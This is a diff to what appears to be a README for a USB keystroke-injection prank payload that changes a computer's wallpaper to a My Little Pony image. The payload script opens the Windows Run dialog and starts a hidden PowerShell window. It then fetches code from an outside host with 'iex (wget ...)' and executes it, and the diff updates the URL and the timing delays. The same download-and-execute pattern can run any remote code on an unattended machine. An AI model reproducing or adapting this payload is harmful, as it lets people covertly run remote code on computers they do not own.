@@ -1,14 +1,19 @@
 Pre-written and execution-ready code:
 
-If you do not have access to a web server and want to get this running, here is pre-uploaded code. The bitlink points to [this gist](https://gist.github.com/judge2020/034d6201d6b24f079e0d692bea3e92b0) containing the PS code, and the image is hosted on github directly.
+If you do not have access to a web server and want to get this running, here is pre-uploaded code. Code is at [this gist](https://gist.github.com/judge2020/034d6201d6b24f079e0d692bea3e92b0) containing the PS code, and the image is hosted on GitHub directly.
 
+By default, it goes to an My Little Pony image, however you can set the 'image' GET parameter to change it at will. Eg change `https://judge.sh/wallpaper.php` to 'https://judge.sh/wallpaper.php?image=https://imgur.com/test.png'.
 ```
-SLEEP 600
+SLEEP 1000
 GUI r
-DELAY 150
-STRING powershell -windowstyle hidden iex (wget http://bit.ly/2f1uwGD)
+DELAY 250
+STRING powershell -windowstyle hidden iex (wget https://judge.sh/wallpaper.php)
 ENTER
 ```
+
+
+Below is original text
+---
 
 
 GET THE CODE SNIPS HERE:
